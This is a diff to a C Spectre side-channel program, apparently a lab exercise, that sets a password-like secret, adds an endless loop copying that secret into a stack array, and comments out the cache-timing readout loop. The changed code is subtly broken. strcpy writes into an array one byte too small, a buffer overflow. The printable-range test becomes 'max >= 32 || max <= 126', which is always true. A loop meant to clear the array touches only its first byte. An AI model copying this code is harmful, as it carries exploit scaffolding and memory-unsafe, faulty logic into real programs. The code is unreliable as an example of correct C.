@@ -7,7 +7,7 @@
 unsigned int buffer_size = 10;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
 uint8_t temp = 0;
-char *secret = "Some Secret Value";   
+char *secret = "SSHPassword123";   
 uint8_t array[256*4096];
 uint8_t scores[256];
 
@@ -71,12 +71,20 @@ void spectreAttack(size_t larger_x)
 }
 
 int main() {
+  char tmp_arr[strlen(secret)];
+  while(1){
+    for(int i = 0; i < strlen(secret); i++){
+      tmp_arr[0] = 0;
+    }
+    strcpy(tmp_arr, secret);
+    printf("%s\n", tmp_arr);
+  }
+/*
   flushSideChannel();
   //size_t larger_x = (size_t)(secret - (char*)buffer);  
   size_t larger_x = (size_t)(secret - (char*)buffer);  
-  larger_x = 0;
   printf("0x%p\n", larger_x);
-  for(int i = 0; i < 0x1024; i++){
+  for(int i = 0; i < 1024; i++){
     for(int j = 0; j < 256; j++){
       scores[j] = 0;
     }
@@ -90,13 +98,13 @@ int main() {
         max = j;
       }
     }
-    if(max >= 32 && max <= 126){
+    if(max >= 32 || max <= 126){
       printf("  %c ", max);
     } else {
       printf("\\x%02x", max);
     }
     if(i % 18 == 17){ printf("\n"); }
-  }
+*/
   printf("\n");
   return 0;
 }
